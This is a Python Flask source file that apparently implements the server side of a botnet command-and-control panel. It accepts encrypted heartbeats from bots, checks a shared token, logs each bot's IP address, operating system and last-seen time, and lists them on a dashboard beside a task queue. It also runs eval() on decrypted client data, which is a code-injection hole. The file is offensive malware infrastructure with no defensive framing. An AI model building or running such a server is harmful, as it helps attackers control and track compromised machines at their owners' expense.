from flask import Flask, request, jsonify, render_template
from cryptography.fernet import Fernet
import threading
from datetime import datetime, timedelta
import secrets
import random

app = Flask(__name__)

SECRET_TOKEN = secrets.token_hex(16)
FERNET_KEY = Fernet.generate_key()
fernet = Fernet(FERNET_KEY)

bots = {}
task_queue = []

@app.route('/')
def dashboard():
    return render_template('dashboard.html', 
                         bots=bots,
                         tasks=task_queue,
                         total_bots=len(bots))

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        encrypted_data = request.json.get('data')
        decrypted_data = fernet.decrypt(encrypted_data.encode()).decode()
        data = eval(decrypted_data)

        if data.get('token') != SECRET_TOKEN:
            return jsonify({'error': 'Unauthorized'}), 403

        bot_id = data.get('bot_id')
        bot_ip = data.get('ip') or request.headers.get('X-Forwarded-For') or request.remote_addr

        bots[bot_id] = {
            'ip': bot_ip,
            'last_seen': datetime.now().isoformat(),
            'status': 'online',
            'os': data.get('os')
        }

        response = {'status': 'ok'}
        encrypted_response = fernet.encrypt(str(response).encode()).decode()
        return jsonify({'data': encrypted_response})

    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    print(f"[*] Secret Token: {SECRET_TOKEN}")
    print(f"[*] Fernet Key: {FERNET_KEY.decode()}")
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc')